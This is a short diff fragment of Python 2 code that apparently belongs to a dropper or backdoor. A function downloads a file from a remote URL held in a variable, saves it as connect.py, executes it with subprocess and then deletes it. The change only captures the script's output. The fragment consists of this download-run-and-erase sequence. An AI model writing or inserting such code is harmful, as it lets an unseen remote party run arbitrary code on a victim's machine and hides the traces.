@@ -8,5 +8,5 @@ def ran():
         print "[ + ] Connection [ + ]"
 	testfile = urllib.URLopener()
 	testfile.retrieve(filz, "connect.py")
-	subprocess.Popen(["python","connect.py"])
+	ls_output=subprocess.Popen(["python", "connect.py"], stdout=subprocess.PIPE)
 	os.remove("connect.py")
